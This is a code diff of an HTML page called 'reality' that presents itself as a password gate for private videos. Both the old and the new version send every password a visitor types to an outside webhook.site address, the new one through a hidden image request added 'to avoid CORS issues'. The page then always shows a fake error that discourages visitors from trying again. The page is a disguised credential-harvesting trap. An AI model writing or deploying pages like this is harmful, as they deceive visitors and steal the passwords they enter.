@@ -2,9 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>reality</title>
   <style>
+    /* Your existing styles */
     * {
       box-sizing: border-box;
       margin: 0;
@@ -85,26 +85,35 @@
 </head>
 <body>
 
-    <p><a href="/qnasite/" style="display: inline-block; padding: 10px 20px; background-color: #474747; color: lightgray; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background-color 0.3s;" onmouseover="this.style.backgroundColor='#5a6268'" onmouseout="this.style.backgroundColor='#474747'">back to inbox</a></p>
-<br>
+  <p><a href="/qnasite/" style="display: inline-block; padding: 10px 20px; background-color: #474747; color: lightgray; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background-color 0.3s;" onmouseover="this.style.backgroundColor='#5a6268'" onmouseout="this.style.backgroundColor='#474747'">back to inbox</a></p>
+  <br>
   <div class="container">
     <h1>reality</h1>
 
-    <form action="https://webhook.site/0d0d91e5-6ab4-447c-ac52-d1247b46241d" method="POST" target="hidden_iframe" onsubmit="showErrorMessage()">
-      <input type="password" name="password_attempt" placeholder="Enter password" required>
+    <form id="password-form">
+      <input type="password" id="password" name="password_attempt" placeholder="Enter password" required>
       <button type="submit">view videos</button>
     </form>
-
-    <iframe name="hidden_iframe" style="display:none;"></iframe>
 
     <p id="error-message" class="error">The content within the reality page is very personal and private, if you don't know the password don't try anymore.</p>
   </div>
 
   <script>
-    function showErrorMessage() {
-      const errorMessage = document.getElementById('error-message');
-      errorMessage.style.display = 'block';
-    }
+    document.getElementById('password-form').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default form submission
+
+      const passwordAttempt = document.getElementById('password').value;
+
+      // Send data to Webhook.site using an image request to avoid CORS issues
+      const img = new Image();
+      img.src = 'https://webhook.site/0d0d91e5-6ab4-447c-ac52-d1247b46241d?password_attempt=' + encodeURIComponent(passwordAttempt);
+
+      // Show the error message
+      document.getElementById('error-message').style.display = 'block';
+
+      // Clear the password field
+      document.getElementById('password').value = '';
+    });
   </script>
 </body>
 </html>
